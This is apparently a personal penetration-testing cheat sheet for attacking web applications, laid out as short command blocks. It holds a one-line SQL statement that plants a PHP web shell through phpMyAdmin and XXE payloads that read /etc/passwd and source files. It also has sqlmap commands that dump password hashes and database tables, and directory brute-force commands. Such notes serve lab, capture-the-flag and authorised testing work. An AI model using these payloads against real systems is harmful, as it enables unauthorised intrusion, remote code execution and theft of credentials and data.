# Web

- [BruteForce](#bruteforce)
- [PhpMyAdmin](#phpmyadmin)
- [XML external entity (XXE)](#xml-external-entity-xxe)
- [Mysql](#mysql)
- [SQL Injection](#sql-injection)
- [Request](#request)

## BruteForce
### ffuf
```
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt:FUZZ -u http://url/FUZZ'
```
```
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt:FUZZ -u http://FUZZ.url/ -H 'Host: FUZZ.host'
```

### Gobuster
```
gobuster dir -u <url> -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 25 -x html,php
```

### Dirb
```
dirb url -R
```

### Dibuster
```
dirbuster
```

### Zap
```
owasp-zap
```

## PhpMyAdmin
### Quick Shellcode
```sql
SELECT "<?php system($_GET['cmd']); ?>" into outfile "/dir/dir/file.php"
```

## XML external entity (XXE)
### Read File
```xml
<!DOCTYPE foo [
    <!ENTITY file SYSTEM "file:///etc/passwd">
]>
<foo>Hello &file;</foo>
```
```xml
<!DOCTYPE foo [
    <!ENTITY file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd" >
]>
<foo>Hello &file;</foo>
```
### Get Link
```xml
<!DOCTYPE foo [
    <!ENTITY file SYSTEM "http://example.com/path">
]>
<foo>Hello &file;</foo>
```
```xml
<!DOCTYPE foo [
    <!ENTITY file SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">
]>
<foo>Hello &file;</foo>
```

## MySql
### Connect to mysql
```
mysql -h localhost -u myname -p
```
### Show Info
```
SHOW DATABASES;
use db_name
SHOW TABLES;
select * from table_name
```
### Open SQLite3
```
sqlite3 database.sqlite3
```
or open in vs code

## SQL Injection
### SQLmap
```
sqlmap -r req --proxy=http://localhost:8080 --batch
sqlmap -r req --proxy=http://localhost:8080 --batch --passwords
sqlmap -r req --proxy=http://localhost:8080 --batch --dbs
sqlmap -r req --proxy=http://localhost:8080 --batch --fetch --tables -D db
sqlmap -r req --proxy=http://localhost:8080 --batch --dump -T table -D db
```

## Request
### Curl
```
curl 'http://example.com/login' -H 'Content-Type: application/x-www-form-urlencoded' --data-raw 'username=login&password=pass'
```

### Python (requests)
```python
import requests

s = requests.session()
# s.proxies = {
#   "http": "localhost:8080",
#   "https": "localhost:8080",
# }

r = s.get('http://example.com')
print(r.text)
r = s.post('http://example.com/submit',
    headers={
        'Content-type': 'raw',
    },
    data={'user': 'guest'},
    # auth=('username', 'password')
)
print(r.status_code, r.url)
```
